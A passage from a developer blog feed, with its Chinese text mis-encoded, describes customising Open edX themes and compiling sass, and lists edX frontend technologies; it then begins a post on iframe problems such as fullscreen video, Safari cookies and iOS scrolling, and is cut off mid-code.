class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/edx-platform/lms/static/images</span><br><span class="line">/edx-platform/lms/static/sass</span><br><span class="line">/edx-platform/lms/templates</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> æƒ³è¦è¦†ç›–ä¸Šé¢çš„æ–‡ä»¶ï¼Œéœ€è¦åœ¨ä¸»é¢˜åŒ…é‡Œåˆ›å»ºå¯¹åº”çš„æ–‡ä»¶</span><br><span class="line">/themes/normal-theme/lms/static</span><br><span class="line">/themes/normal-theme/lms/sass</span><br><span class="line">/themes/normal-theme/lms/templates</span><br></pre></td></tr></table></figure></p><p><br><br><em>æ·»åŠ ä¸»é¢˜åŒ…</em><br>åœ¨<code>/edx-platform/themes</code>æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹<code>normal-theme</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">normal-theme</span><br><span class="line">    â”œâ”€â”€ README.rst</span><br><span class="line">    â”œâ”€â”€â”€ lms</span><br><span class="line">    |     â”œâ”€â”€ static</span><br><span class="line">    |     |      â””â”€â”€ images</span><br><span class="line">    |     |      |     â””â”€â”€ logo.png</span><br><span class="line">    |     |      |</span><br><span class="line">    |     |      â””â”€â”€ sass</span><br><span class="line">    |     |            â””â”€â”€ partials</span><br><span class="line">    |     |                   â””â”€â”€ base</span><br><span class="line">    |     |                        â””â”€â”€ _variables.scss</span><br><span class="line">    |     |</span><br><span class="line">    |     â””â”€â”€ templates</span><br><span class="line">    |             â””â”€â”€ footer.html</span><br><span class="line">    |             â””â”€â”€ header.html</span><br></pre></td></tr></table></figure></p><p><br><br><em>ä¿®æ”¹é…ç½®æ–‡ä»¶</em><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> è¿›å…¥æ–‡ä»¶ç›®å½•</span><br><span class="line">make lms-shell</span><br><span class="line">cd /edx/app/edxapp</span><br><span class="line">LMS         /edx/app/edxapp/lms.env.json</span><br><span class="line">Studio       /edx/app/edxapp/cms.env.json</span><br><span class="line">E-commerce   /edx/etc/ecommerce.yml</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> ä¿®æ”¹é…ç½®é¡¹</span><br><span class="line">"ENABLE_COMPREHENSIVE_THEMING": true,</span><br><span class="line">"COMPREHENSIVE_THEME_DIRS": [</span><br><span class="line">  "/edx/app/edxapp/edx-platform/themes"</span><br><span class="line">],</span><br><span class="line">"THEME_NAME": "normal-theme",</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> é‡å¯æœåŠ¡</span><br><span class="line">docker-compose restart lms</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> ç¼–è¯‘é™æ€èµ„æº</span><br><span class="line">make lms-static</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> è¿›å…¥`localhost:18000/admin`,è¿›å…¥Site themes, æ·»åŠ site themesã€‚ä¿å­˜åï¼Œè®¿é—®0.0.0.0:18000å³ç”Ÿæ•ˆã€‚</span><br><span class="line">Site:</span><br><span class="line">Domain name: 0.0.0.0:18000</span><br><span class="line">Display name: normal-theme</span><br><span class="line">Theme dir name: normal-theme</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-ä¸»é¢˜ä¿®æ”¹"><a href="#5-ä¸»é¢˜ä¿®æ”¹" class="headerlink" title="5. ä¸»é¢˜ä¿®æ”¹"></a>5. ä¸»é¢˜ä¿®æ”¹</h3><p>æ”¹edxä¸»é¢˜æ˜¯ä¸€ä»¶éå¸¸ç—›è‹¦çš„äº‹ä»¶ã€‚æ¯æ”¹ä¸€ä¸ªåœ°æ–¹ï¼Œéœ€è¦æ‰§è¡Œä¸€æ¬¡ç¼–è¯‘å‘½ä»¤ï¼Œæ‰èƒ½çœ‹åˆ°æ•ˆæœã€‚å¿«åˆ™1åˆ†é’Ÿï¼Œæ…¢åˆ™20åˆ†é’Ÿã€‚åŒæ—¶ï¼Œedxçš„æ¨¡æ¿å±‚å±‚åµŒå¥—ï¼ŒåŒä¸€ä¸ªclassNameä¼šåº”ç”¨åˆ°å¤šä¸ªé¡µé¢ï¼Œç‰µä¸€å‘åŠ¨å…¨èº«ã€‚åŠ ä¸ŠclassNameåˆé•¿åˆä¹±ï¼Œcssä¹Ÿæ˜¯æ²¡å•¥ç« æ³•ï¼Œ<code>border-box</code>ä¸<code>content-box</code>æ··ç”¨ï¼Œæ ·å¼ä¹±åŠ <code>!important</code>ï¼Œå¾ˆå¤šæ—¶å€™ä½ ä¸å¾—ä¸å†å¼ºåˆ¶åŠ ä¸€ä¸ª<code>!important</code>å»è¦†ç›–å®ƒã€‚åŠ ä¸Šæœ¬èº«æ²¡æœ‰ä½¿ç”¨ä»»ä½•åŸºç¡€åº“ï¼Œå› æ­¤è¡ç”Ÿå‡ºå¾ˆå¤šå…¼å®¹é—®é¢˜ã€‚</p><ul><li>å€¼å¾—é«˜å…´çš„æ˜¯ï¼Œå¤§éƒ¨åˆ†é¡µé¢éƒ½å·²ç»å®Œæˆäº†æ ·å¼è°ƒæ•´ã€‚</li><li>å¼€å‘ç¯å¢ƒèµ°äº†å¦ä¸€å¥—ç¼–è¯‘ï¼Œä½ æ— éœ€æ‰§è¡Œedxçš„ç¼–è¯‘å‘½ä»¤ï¼Œå°±å¯ä»¥çœ‹åˆ°ä¿®æ”¹æ•ˆæœã€‚</li><li>å¦‚æœæœ‰æ–°å¢çš„éœ€æ±‚ï¼Œä½ éœ€è¦éµå¾ªä¸€äº›è®¾è®¡è§„èŒƒã€‚</li></ul><p><br></p><h4 id="5-1-sassç¼–è¯‘"><a href="#5-1-sassç¼–è¯‘" class="headerlink" title="5.1 sassç¼–è¯‘"></a>5.1 sassç¼–è¯‘</h4><p>å…ˆç¡®ä¿å®‰è£…äº†<a href="https://www.sass.hk/install/" target="_blank" rel="noopener">Sass</a><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> edx-platformç¼–è¯‘</span><br><span class="line"><span class="meta">#</span> æ³¨æ„ï¼Œå½“ç¼–è¯‘ä¸æ˜¯ä¸»é¢˜åŒ…é‡Œé¢çš„sassæ–‡ä»¶æ—¶ï¼Œä¾ç„¶è¦èµ°edxçš„ç¼–è¯‘å‘½ä»¤ make lms-static</span><br><span class="line">cd edx-platform/themes/normal-theme/lms/static/</span><br><span class="line">sass --watch sass:css --no-cache</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> edx-membershipç¼–è¯‘</span><br><span class="line">cd edx-membership/membership/static/membership/</span><br><span class="line">sudo sass --watch sass:css --no-cache</span><br></pre></td></tr></table></figure></p><p>edxä¸åŒé¡µé¢å¼•ç”¨äº†ä¸åŒçš„cssæ–‡ä»¶ï¼Œå› æ­¤äº§ç”Ÿäº†å¾ˆå¤šå…¥å£æ–‡ä»¶ï¼Œå…·ä½“è§<code>/edx-platform/lms/static/sass</code>ï¼Œé‡Œé¢æ²¡æœ‰ä»¥<code>_</code>å¼€å¤´çš„æ–‡ä»¶éƒ½æ˜¯ä¸€ä¸ªå…¥å£æ–‡ä»¶ã€‚</p><p>å½“ä½ éœ€è¦æ–°å¢ä¸€ä¸ªå…¥å£æ–‡ä»¶ï¼Œåº”å½“å…ˆå°†å…¶å¯¹åº”çš„cssæ–‡ä»¶<code>/edx-platform/lms/static/css</code>è½¬æ¢ä¸ºscssæ–‡ä»¶ï¼Œå¤åˆ¶åˆ°<code>normal-theme/lsm/static/sass/default</code>ã€‚å…¥å£æ–‡ä»¶ï¼Œåº”å…ˆå¼•ç”¨è¯¥æ–‡ä»¶ï¼Œä»£è¡¨ç€å…ˆå¼•ç”¨äº†edxåŸæœ‰æ ·å¼ã€‚ç„¶åä½ å¯ä»¥æŠŠä½ çš„ä¿®æ”¹æ”¾è¿›<code>normal-theme/lsm/static/sass/modify</code>æ–‡ä»¶ã€‚</p><p>å½“edxå‡çº§ç‰ˆæœ¬æ—¶ï¼Œä½ éœ€è¦æ›´æ–°<code>/default</code>çš„å†…å®¹ã€‚è€Œä½ é¢å¤–çš„ä¿®æ”¹å°†å¾—åˆ°ä¿ç•™ã€‚å½“ç„¶å¦‚æœå‘ç”Ÿäº†ç¿»å¤©è¦†åœ°çš„å˜åŠ¨ï¼Œå°±å¦è¯´ã€‚<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">normal-theme/lsm/static/sass</span><br><span class="line">    â”œâ”€â”€â”€ bootstrap</span><br><span class="line">    |     â”œâ”€â”€ lms-main.scss  # å…¥å£æ–‡ä»¶</span><br><span class="line">    â”œâ”€â”€â”€ default             # edxåŸæœ‰æ ·å¼</span><br><span class="line">    |     â”œâ”€â”€ _lms-course.scss</span><br><span class="line">    |     â”œâ”€â”€ _lms-discussion-bootstrap.scss</span><br><span class="line">    |     â”œâ”€â”€ _lms-main-v1.scss</span><br><span class="line">    |     â”œâ”€â”€ _lms-main-v2.scss</span><br><span class="line">    |     â”œâ”€â”€ _lms-main.scss</span><br><span class="line">    â”œâ”€â”€â”€ discussion</span><br><span class="line">    |     â”œâ”€â”€ lms-discussion-bootstrap.scss  # å…¥å£æ–‡ä»¶</span><br><span class="line">    â”œâ”€â”€â”€ modify</span><br><span class="line">    |     â”œâ”€â”€ lms</span><br><span class="line">    |     |      â””â”€â”€ course            # è¯¾ç¨‹ç›¸å…³</span><br><span class="line">    |     |      â””â”€â”€ footer            </span><br><span class="line">    |     |      â””â”€â”€ page              </span><br><span class="line">    |     |      â””â”€â”€ _extras.scss      # é›†åˆäº†header,footer,iconfont,base,alertç­‰å…±ç”¨è§„åˆ™ï¼Œæ‰€æœ‰å…¥å£æ–‡ä»¶å‡å¯å…ˆå¼•ç”¨è¿™ä¸€æ–‡ä»¶</span><br><span class="line">    |     |      â””â”€â”€ _variables.scss   # å®šä¹‰sasså˜é‡</span><br><span class="line">    â”œâ”€â”€â”€ lms-course.scss     # å…¥å£æ–‡ä»¶</span><br><span class="line">    â”œâ”€â”€â”€ lms-main-v1.scss    # å…¥å£æ–‡ä»¶</span><br><span class="line">    â”œâ”€â”€â”€ lms-main-v2.scss    # å…¥å£æ–‡ä»¶</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-2-ä¸€äº›è§„èŒƒ"><a href="#5-2-ä¸€äº›è§„èŒƒ" class="headerlink" title="5.2 ä¸€äº›è§„èŒƒ"></a>5.2 ä¸€äº›è§„èŒƒ</h4><ul><li><em>é€‚é…è¦æ±‚</em><br>pcå“åº”å¼å¸ƒå±€ï¼Œå…¼å®¹ipadï¼Œæ‰‹æœºï¼Œå…¼å®¹IE11<br>å›¾ç‰‡èµ„æºpcä½¿ç”¨äºŒå€å›¾ï¼Œæ‰‹æœºä½¿ç”¨ä¸‰å€å›¾<br>pcè®¾è®¡ç¨¿å°ºå¯¸1400px*auto (å†…å®¹1200px*auto), æ‰‹æœºè®¾è®¡ç¨¿å°ºå¯¸375px*auto<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* å…¼å®¹ipad */</span></span><br><span class="line">@<span class="keyword">media</span> screen and (max-width:<span class="number">768px</span>)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* å…¼å®¹æ‰‹æœºï¼Œè€ƒè™‘äº†éƒ¨åˆ†æ‰‹æœºæ¨ªå±çš„æƒ…å†µ */</span></span><br><span class="line">@<span class="keyword">media</span> screen and (max-width:<span class="number">767px</span>)&#123;&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>å˜é‡</em><br>æ›´å¤šå˜é‡æŸ¥çœ‹ <code>/edx-platform/themes/normal-theme/lms/static/sass/modify/lms/_variables.scss</code>ï¼Œè®¾è®¡ç¨¿æœ‰æ—¶ä¸ä¼š100%æŒ‰è¿™ä¸ªæ ‡å‡†ï¼Œæ­¤æ—¶åº”ä¼˜å…ˆä½¿ç”¨è¿™äº›å˜é‡ã€‚<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ä¸»è‰²è°ƒ */</span> </span><br><span class="line">$primary: #4788C7;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* å­—ä½“é¢œè‰²: æ ‡é¢˜ï¼Œæ­£æ–‡ï¼Œæ³¨é‡Šï¼Œplaceholder */</span> </span><br><span class="line">$title: #2E313C;</span><br><span class="line">$font: #656D78;</span><br><span class="line">$note: #AAB2BD;</span><br><span class="line">$placeholder: #ccd1d9;</span><br><span class="line">$font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,"Helvetica Neue", Helvetica,Tahomaï¼ŒArial, "PingFang SC", "Hiragino Sans GB", </span><br><span class="line">"<span class="selector-tag">Heiti</span> <span class="selector-tag">SC</span>", "<span class="selector-tag">Microsoft</span> <span class="selector-tag">YaHei</span>", "<span class="selector-tag">WenQuanYi</span> <span class="selector-tag">Micro</span> <span class="selector-tag">Hei</span>",<span class="selector-tag">SimHei</span>ï¼Œ<span class="selector-tag">sans-serif</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* border */</span></span><br><span class="line">$border:#b6dcfe;</span><br><span class="line">$border-gray: #f5f7fa;</span><br><span class="line">$border-radius: 3px;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* æ­£æ–‡å­—ä½“ç»Ÿä¸€ä¸º14px */</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>é€šç”¨æ ·å¼</em><br>æŸ¥çœ‹<code>/edx-platform/themes/normal-theme/lms/static/sass/modify/lms/page/_base.scss</code>ï¼Œè¿™ä¸ªæ–‡ä»¶å®šä¹‰äº†button, input, select, <code>&lt;a&gt;</code>çš„æ ·å¼ã€‚å¼€å‘æ—¶åº”ç»Ÿä¸€ä½¿ç”¨è¿™äº›å˜é‡ã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@extend %btn-my-primary;</span><br><span class="line">@extend %btn-my-white;</span><br><span class="line">@extend %btn-my-disable;</span><br><span class="line"></span><br><span class="line">@extend %input-my;</span><br><span class="line">@extend %input-my-checkbox;</span><br><span class="line">@extend %input-my-radio;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><p><em>é¿å…ä¿®æ”¹å¤–å±‚divçš„classæ ·å¼</em><br>edxæ‰€æœ‰é¡µé¢å‡è¢«ä¸‹é¢ä¸¤ä¸ª<code>&lt;div&gt;</code>åŒ…è£¹ï¼Œæ³¨æ„ä¸è¦è½»æ˜“ä¿®æ”¹ã€æ–°å¢è¿™ä¸¤ä¸ªclassNameçš„æ ·å¼ï¼Œä¸ç„¶å…¶ä»–é¡µé¢éƒ½ä¼šå‘ç”Ÿå˜åŠ¨ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"window-wrap"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content-wrapper"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é™¤äº†è¿™ä¸¤ä¸ªclassNameï¼Œé¡µé¢é‡Œé¢ä¹Ÿæœ‰å¾ˆå¤šå¾ˆå¤šå¾ˆå¤šå…±ç”¨çš„classNameã€‚<br>ä¿®æ”¹sassçš„æ—¶å€™ï¼Œåº”å½“åœ¨å¤–é¢åŒ…ä¸€ä¸ªä¸“å±è¿™ä¸ªé¡µé¢çš„classNameï¼Œé¿å…å½±å“åˆ°å…¶ä»–é¡µé¢</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/edx-platform/themes/normal-theme/lms/static/sass/modify/lms/page/_login.scss</span><br><span class="line"></span><br><span class="line"><span class="comment">/* åªå¯¹login-registerä¸‹çš„h2ç”Ÿæ•ˆ */</span></span><br><span class="line"><span class="selector-class">.login-register</span>&#123;</span><br><span class="line">  h2&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>æ›¿æ¢icon</em><br>iconä½¿ç”¨é›ªç¢§å›¾æ›¿æ¢ï¼Œå…·ä½“æŸ¥çœ‹<code>/edx-platform/themes/normal-theme/lms/static/sass/modify/lms/page/_iconfont.scss</code></li></ul><p><br></p><h4 id="5-3-æ›¿æ¢templates"><a href="#5-3-æ›¿æ¢templates" class="headerlink" title="5.3 æ›¿æ¢templates"></a>5.3 æ›¿æ¢templates</h4><p>å¦‚æœéœ€è¦ä¿®æ”¹/templatesï¼Œéœ€æŠŠåŸæ¥çš„æ¨¡æ¿æ–‡ä»¶å¤åˆ¶ä¸€ä»½ï¼Œæ”¾åˆ°ä¸»é¢˜ä¸‹ï¼Œåœ¨å…¶åŸºç¡€ä¸Šä¿®æ”¹ã€‚<br>å½“æ¨¡æ¿é‡Œéœ€è¦æ·»åŠ å›¾ç‰‡éœ€ä½¿ç”¨<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"$&#123;static.url("</span><span class="attr">images</span>/<span class="attr">logo.svg</span>")&#125; "&gt;</span></span><br></pre></td></tr></table></figure></p><p>Note that the code snippet ${static.url(â€œimages/logo.svgâ€)} directs Mako to leverage the comprehensive theming system, which will first check to see if your custom theme contains the file â€œlogo.svgâ€, and if so, then this is the image file that will be sent to the browser. </p><p>All image files and other â€œstatic assetsâ€ are pre-processed using an open source utility named Paver that consolidates the files into a caching area located in <code>/edx/var/edxapp/staticfiles</code> whereupon each file is individually optimized.</p><p><br></p><h3 id="6-edxå‰ç«¯æŠ€æœ¯é€‰å‹"><a href="#6-edxå‰ç«¯æŠ€æœ¯é€‰å‹" class="headerlink" title="6. edxå‰ç«¯æŠ€æœ¯é€‰å‹"></a>6. edxå‰ç«¯æŠ€æœ¯é€‰å‹</h3><p>Edxå‰ç«¯å›Šæ‹¬äº†å±•ç¤ºç»™ç”¨æˆ·çš„æ‰€æœ‰ä¸œè¥¿ï¼Œä¸»è¦åŒ…æ‹¬ç”¨Pythonæ¸²æŸ“çš„viewsï¼Œç”¨jså†™çš„é¡µé¢äº¤äº’ï¼Œå’Œcssæ ·å¼ã€‚</p><p><em>Edxç›¸å…³æŠ€æœ¯</em></p><ul><li>Test: React components can be tested in isolation with unit tests using <code>Jest</code> and <code>Enzyme</code>.</li><li>ES6</li><li>Babel</li><li>ESLint</li><li>npm</li><li>GreenKeeper</li><li>webpack</li><li>AMD(å¼‚æ­¥æ¨¡å—å®šä¹‰ï¼‰</li><li>Sass</li><li>JWT</li><li>Axios</li><li>React and Redux<br>å½“æ„å»ºæ–°UIçš„æ—¶å€™ï¼Œåº”å½“ä½¿ç”¨Reactã€‚ä½†æ˜¯ç°åœ¨ç»å¤§éƒ¨åˆ†æ²¡æœ‰ä½¿ç”¨ã€‚ä¸Šæ¬¡edxå¹´ä¼šè¯´ï¼Œ2019å¹´åº•ä¼šå®Œæˆå‘reactè½¬ç§»ã€‚</li></ul><p><br><br><em>ä¸€äº›æ–°React Appä»“åº“</em><br>Accounté¡µ  <a href="https://github.com/edx/frontend-app-account" target="_blank" rel="noopener">https://github.com/edx/frontend-app-account</a><br>Profileé¡µ  <a href="https://github.com/edx/frontend-app-profile" target="_blank" rel="noopener">https://github.com/edx/frontend-app-profile</a></p><ul><li>ç¯å¢ƒå˜é‡é€šè¿‡webpack.configä¸­process.envé…ç½®</li><li>æ²¡æœ‰å‘ç°ä½¿ç”¨äº†UIåº“</li><li>ä½¿ç”¨redux,axios,mock</li><li>å¡åœ¨äº†<code>Access to XMLHttpRequest at â€™http://localhost:18000/api/user/v1/accounts/edx&#39; from origin â€˜http://localhost:1997â€™ has been blocked by CORS policy: Request header field use-jwt-cookie is not allowed by Access-Control-Allow-Headers in preflight response.â€</code><br>slackå›å¤éœ€æ›´æ–°masteråˆ†æ”¯devstackã€‚</li><li>ä¸€äº›å·²ç»å¤šä¸ªreact appç”¨åˆ°çš„åŒ…<br>@edx/frontend-auth  ç»Ÿä¸€å¤„ç†ç™»å½•<br>@edx/edx-bootstrap<br>@edx/frontend-component-footer</li></ul><p><br><br><em>publisher-frontend</em><br><a href="https://github.com/edx/publisher-frontend" target="_blank" rel="noopener">https://github.com/edx/publisher-frontend</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è·¯ç”±                    å¯¹åº”ç»„ä»¶              åŠŸèƒ½</span><br><span class="line">/courses/new           CreateCourse         æ–°å»ºè¯¾ç¨‹ï¼Œå¡«å†™org, title, price,</span><br><span class="line">/courses/:id/rerun     CreateCourseRun</span><br><span class="line">/instructors/new       CreateStaffer        æ–°å»ºStaff,å¡«å†™name,organization_id, bio, major_works</span><br><span class="line">/instructors/:uuid     EditStaffer</span><br><span class="line">/                      CourseDashboard      åˆ—è¡¨course name, course number, owner, modified</span><br><span class="line">/courses/:id           EditCourse           ç¼–è¾‘è¯¾ç¨‹ title, description, what will you learn, primary subject,course-image, about-video-link</span><br></pre></td></tr></table></figure><p><br></p><h3 id="å‚è€ƒæ–‡æ¡£"><a href="#å‚è€ƒæ–‡æ¡£" class="headerlink" title="å‚è€ƒæ–‡æ¡£"></a>å‚è€ƒæ–‡æ¡£</h3><ul><li><a href="http://docs.edx.org/" target="_blank" rel="noopener">edxå®˜æ–¹æ–‡æ¡£</a></li><li><a href="https://edx.readthedocs.io/projects/edx-installing-configuring-and-running/en/latest/configuration/changing_appearance/theming/index.html" target="_blank" rel="noopener">edxä¸»é¢˜åŒ…å®˜æ–¹æ–‡æ¡£</a></li><li><a href="https://github.com/edx/devstack" target="_blank" rel="noopener">å®‰è£…edx Hç‰ˆ</a></li><li><a href="https://blog.lawrencemcdaniel.com/how-to-change-the-open-edx-logo/" target="_blank" rel="noopener">How To Change the Open edX Logo</a></li><li><a href="https://open-edx-proposals.readthedocs.io/en/latest/oep-0011-bp-FED-technology.html" target="_blank" rel="noopener">OEP-11: Front End Technology Standards</a></li></ul>]]></content>
      
      <categories>
          
          <category> Work </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>iframeçš„å„ç§é—®é¢˜</title>
      <link href="/2019/04/30/iframe/"/>
      <url>/2019/04/30/iframe/</url>
      <content type="html"><![CDATA[<h3 id="1-è§†é¢‘æ— æ³•å…¨å±"><a href="#1-è§†é¢‘æ— æ³•å…¨å±" class="headerlink" title="1. è§†é¢‘æ— æ³•å…¨å±"></a>1. è§†é¢‘æ— æ³•å…¨å±</h3><p>ä½¿ç”¨video.jsæ—¶ï¼Œiframeå†…åµŒè§†é¢‘æ— æ³•å…¨å±ã€‚ ä¸ºiframeæ·»åŠ <code>allowfullscreen</code>å±æ€§å³å¯<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"video.html"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">frameborder</span>=<span class="string">"0"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">width</span>=<span class="string">"100%"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">height</span>=<span class="string">"100%"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">scrolling</span>=<span class="string">"no"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">allowfullscreen</span>=<span class="string">"true"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">webkitallowfullscreen</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag"><span class="attr">mozallowfullscreen</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-safariæµè§ˆå™¨ä¸­iframeåµŒå¥—çš„é¡µé¢æ— æ³•ä¿å­˜cookie"><a href="#2-safariæµè§ˆå™¨ä¸­iframeåµŒå¥—çš„é¡µé¢æ— æ³•ä¿å­˜cookie" class="headerlink" title="2. safariæµè§ˆå™¨ä¸­iframeåµŒå¥—çš„é¡µé¢æ— æ³•ä¿å­˜cookie"></a>2. safariæµè§ˆå™¨ä¸­iframeåµŒå¥—çš„é¡µé¢æ— æ³•ä¿å­˜cookie</h3><p>Safari çš„å®‰å…¨ç­–ç•¥å¤ªä¸¥æ ¼äº†ï¼Œiframe åµŒå¥—çš„ç½‘ç«™çš„ cookie è¢«è®¤ä¸ºæ˜¯ä¸å®‰å…¨çš„ï¼Œå› æ­¤ä¸å…è®¸ä¿å­˜ï¼Œè¿™å°±å¯¼è‡´äº†ç”¨æˆ·å³ä½¿åœ¨ iframe ä¸­ç™»å½•äº†ç½‘ç«™ï¼Œä¹Ÿæ— æ³•ä¿æŒç™»å½•çŠ¶æ€ï¼Œæ¯æ¬¡è·³è½¬é¡µé¢ä¹‹åå°±éœ€è¦é‡æ–°ç™»å½•ã€‚ </p><p>è§£å†³æ–¹æ³•ï¼š<br>å¼ºè¡ŒæŠŠ iframe çš„çˆ¶çº§é¡µé¢è·³è½¬åˆ°å­é¡µé¢æ‰€åœ¨çš„ç½‘ç«™ï¼Œç„¶åè®¾ç½®å¥½ session ï¼Œå†é‡å®šå‘åˆ°çˆ¶çº§é¡µé¢ï¼Œè¿™æ—¶å€™è®¾ç½®çš„ cookie å°±è¢«è®¤ä¸ºæ˜¯å®‰å…¨çš„äº†ã€‚ </p><p><br></p><h3 id="3-iframeåœ¨IOSæ‰‹æœºä¸Šæ— æ³•æ»šåŠ¨"><a href="#3-iframeåœ¨IOSæ‰‹æœºä¸Šæ— æ³•æ»šåŠ¨" class="headerlink" title="3. iframeåœ¨IOSæ‰‹æœºä¸Šæ— æ³•æ»šåŠ¨"></a>3. iframeåœ¨IOSæ‰‹æœºä¸Šæ— æ³•æ»šåŠ¨</h3><p>è§£å†³æ–¹æ³•ï¼š<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">  <span class="selector-class">.iframe-outer</span>&#123;</span></span><br><span class="line"><span class="undefined">    position: fixed;</span></span><br><span class="line"><span class="undefined">    right: 